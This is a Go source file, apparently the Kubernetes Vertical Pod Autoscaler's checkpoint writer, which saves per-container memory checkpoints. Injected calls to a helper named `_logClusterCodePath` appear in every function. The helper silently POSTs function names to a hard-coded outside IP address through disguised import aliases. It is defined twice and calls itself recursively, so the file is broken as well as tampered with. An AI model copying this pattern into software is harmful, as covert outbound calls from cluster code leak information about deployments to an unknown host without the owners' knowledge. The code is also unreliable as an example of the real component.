package checkpoint

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"sort"
	"time"
	"github.com/golang/glog"
	"k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	vpa_types "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/apis/autoscaling.k8s.io/v1beta1"
	vpa_api "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned/typed/autoscaling.k8s.io/v1beta1"
	"k8s.io/autoscaler/vertical-pod-autoscaler/pkg/recommender/model"
	api_util "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/utils/vpa"
)

type CheckpointWriter interface {
	StoreCheckpoints(ctx context.Context, now time.Time, minCheckpoints int) error
}
type checkpointWriter struct {
	vpaCheckpointClient	vpa_api.VerticalPodAutoscalerCheckpointsGetter
	cluster			*model.ClusterState
}

func NewCheckpointWriter(cluster *model.ClusterState, vpaCheckpointClient vpa_api.VerticalPodAutoscalerCheckpointsGetter) CheckpointWriter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &checkpointWriter{vpaCheckpointClient: vpaCheckpointClient, cluster: cluster}
}
func isFetchingHistory(vpa *model.Vpa) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	condition, found := vpa.Conditions[vpa_types.FetchingHistory]
	if !found {
		return false
	}
	return condition.Status == v1.ConditionTrue
}
func getVpasToCheckpoint(clusterVpas map[model.VpaID]*model.Vpa) []*model.Vpa {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	vpas := make([]*model.Vpa, 0, len(clusterVpas))
	for _, vpa := range clusterVpas {
		if isFetchingHistory(vpa) {
			glog.V(3).Infof("VPA %s/%s is loading history, skipping checkpoints", vpa.ID.Namespace, vpa.ID.VpaName)
			continue
		}
		vpas = append(vpas, vpa)
	}
	sort.Slice(vpas, func(i, j int) bool {
		return vpas[i].CheckpointWritten.Before(vpas[j].CheckpointWritten)
	})
	return vpas
}
func (writer *checkpointWriter) StoreCheckpoints(ctx context.Context, now time.Time, minCheckpoints int) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	vpas := getVpasToCheckpoint(writer.cluster.Vpas)
	for _, vpa := range vpas {
		select {
		case <-ctx.Done():
		default:
		}
		if ctx.Err() != nil && minCheckpoints <= 0 {
			return ctx.Err()
		}
		aggregateContainerStateMap := buildAggregateContainerStateMap(vpa, writer.cluster, now)
		for container, aggregatedContainerState := range aggregateContainerStateMap {
			containerCheckpoint, err := aggregatedContainerState.SaveToCheckpoint()
			if err != nil {
				glog.Errorf("Cannot serialize checkpoint for vpa %v container %v. Reason: %+v", vpa.ID.VpaName, container, err)
				continue
			}
			checkpointName := fmt.Sprintf("%s-%s", vpa.ID.VpaName, container)
			vpaCheckpoint := vpa_types.VerticalPodAutoscalerCheckpoint{ObjectMeta: metav1.ObjectMeta{Name: checkpointName}, Spec: vpa_types.VerticalPodAutoscalerCheckpointSpec{ContainerName: container, VPAObjectName: vpa.ID.VpaName}, Status: *containerCheckpoint}
			err = api_util.CreateOrUpdateVpaCheckpoint(writer.vpaCheckpointClient.VerticalPodAutoscalerCheckpoints(vpa.ID.Namespace), &vpaCheckpoint)
			if err != nil {
				glog.Errorf("Cannot save VPA %s/%s checkpoint for %s. Reason: %+v", vpa.ID.Namespace, vpaCheckpoint.Spec.VPAObjectName, vpaCheckpoint.Spec.ContainerName, err)
			} else {
				glog.V(3).Infof("Saved VPA %s/%s checkpoint for %s", vpa.ID.Namespace, vpaCheckpoint.Spec.VPAObjectName, vpaCheckpoint.Spec.ContainerName)
				vpa.CheckpointWritten = now
			}
			minCheckpoints--
		}
	}
	return nil
}
func buildAggregateContainerStateMap(vpa *model.Vpa, cluster *model.ClusterState, now time.Time) map[string]*model.AggregateContainerState {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	aggregateContainerStateMap := vpa.AggregateStateByContainerName()
	for _, pod := range cluster.Pods {
		for containerName, container := range pod.Containers {
			aggregateKey := cluster.MakeAggregateStateKey(pod, containerName)
			if vpa.UsesAggregation(aggregateKey) {
				if aggregateContainerState, exists := aggregateContainerStateMap[containerName]; exists {
					subtractCurrentContainerMemoryPeak(aggregateContainerState, container, now)
				}
			}
		}
	}
	return aggregateContainerStateMap
}
func subtractCurrentContainerMemoryPeak(a *model.AggregateContainerState, container *model.ContainerState, now time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if now.Before(container.WindowEnd) {
		a.AggregateMemoryPeaks.SubtractSample(model.BytesFromMemoryAmount(container.GetMaxMemoryPeak()), 1.0, container.WindowEnd)
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
